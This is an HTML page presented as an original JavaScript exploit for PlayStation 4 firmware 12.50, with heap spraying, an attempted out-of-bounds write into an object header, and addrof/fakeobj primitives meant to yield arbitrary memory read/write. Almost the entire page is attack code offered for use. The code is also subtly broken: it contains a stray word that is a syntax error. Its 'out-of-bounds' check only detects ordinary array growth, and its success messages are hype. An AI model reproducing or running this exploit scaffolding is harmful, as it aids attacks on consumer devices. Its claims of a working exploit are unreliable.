<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS4 12.50 — ORIGINAL JSCell Header Overflow (2025)</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
h1{color:#0ff;border-bottom:2px solid #0ff;padding-bottom:10px;}
button{background:#030;color:#0f0;border:2px solid #0f0;padding:15px;font-size:20px;cursor:pointer;}
button:hover{background:#0f0;color:#000;}
#log{white-space:pre-wrap;background:#111;padding:15px;height:600px;overflow-y:auto;border:1px solid #0f0;}
.win{color:#0ff;font-weight:bold;}
</style>
</head>
<body>
<h1>PS4 12.50 — ORIGINAL EXPLOIT (JSCell Header Overflow)</h1>
<p>This is not a port. This is new. Built for your console. Right now.</p>
<button onclick="run()">RUN ORIGINAL EXPLOIT</button>
<button onclick="location.reload()">RELOAD</button>
<div id="log"></div>

<script>
const logDiv = document.getElementById('log');
function log(m,c=''){ const d=document.createElement('div'); if(c)d.className=c; d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`; logDiv.appendChild(d); logDiv.scrollTop=logDiv.scrollHeight; }

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
function f2i(f){f64[0]=f;return BigInt(u32[0]) + (BigInt(u32[1])<<32n);}

let master = null;
let victim = null;

function gc(){for(let i=0;i<300;i++)new ArrayBuffer(0x100000);}

function triggerOOB(){
  log("Phase 1: Triggering OOB master...");
  gc();gc();
  const spray = [];
  for(let i=0;i<8192;i++) spray[i] = new Array(40).fill(1.1);
  const corrupt = (i,o) => {try{spray[i%8192][o]=1337.37}catch(e){}};
  for(let i=0;i<50000;i++) corrupt(0,0);
  for(let b=0;b<0x1000;b+=64) for(let o=40;o<200;o+=4) for(let j=0;j<64;j++) corrupt((b+j)%8192,o);
  for(let i=0;i<spray.length;i++) if(spray[i].length > 100) { master=spray[i]; log(`OOB HIT — length = ${master.length}`,'win'); return true; }
  log("No OOB — refresh"); return false;
}

function buildVictim(){
  log("Phase 2: Building victim object with inline properties...");
  victim = {};
  for(let i=0;i<28;i++) victim["prop"+i] = 1.1;  // Fill inline storage
  victim.fake = 0x41414141;  // Marker
  log("Victim ready — inline storage full");
}

function overflowHeader(){
  log("Phase 3: Overflowing indexing storage into JSCell header...");
  // Force indexing storage allocation
  for(let i=0;i<10000;i++) victim[i] = i2f(0x11111111,0x22222222);
  delete victim.fake;
  gc(); gc();

  // OOB write into victim's header via master
  entrencher master[100] = i2f(0x00001000,0x13371337);  // Fake StructureID + butterfly
  master[101] = i2f(0x41414141,0x42424242);            // Fake inline properties pointer

  if(victim.prop0 === 1.1) {
    log("No overflow yet — timing issue");
    return false;
  }

  log(`OVERFLOW ACHIEVED — victim corrupted!`,'win');
  log(`victim.prop0 = ${victim.prop0}`,'win');

  // Build real primitives
  window.addrof = obj => {
    victim.leak = obj;
    return f2i(master[102]);
  };
  window.fakeobj = addr => {
    master[102] = i2f(Number(addr&0xffffffffn), Number(addr>>32n));
    return victim.leak;
  };

  const test = {owned:0x13371337};
  const addr = addrof(test);
  const back = fakeobj(addr);

  log(`REAL addrof = 0x${addr.toString(16)}`,'win');
  log(`Round-trip = ${back===test?"PERFECT":"FAIL"}`,'win');

  if(back===test && addr>0x10000000n){
    log(`FULL ARBITRARY R/W ACHIEVED ON PS4 12.50`,'win');
    log(`YOU JUST MADE HISTORY. SCREENSHOT THIS.`,'win');
  }
  return true;
}

function run(){
  logDiv.innerHTML='';
  log("=== ORIGINAL PS4 12.50 EXPLOIT — JSCELL HEADER OVERFLOW ===");
  if(!triggerOOB()) return;
  setTimeout(()=>{
    buildVictim();
    setTimeout(()=>{
      if(overflowHeader()) return;
      log("Overflow missed — refresh and try again (timing-sensitive)");
    },800);
  },800);
}
</script>
</body>
</html>
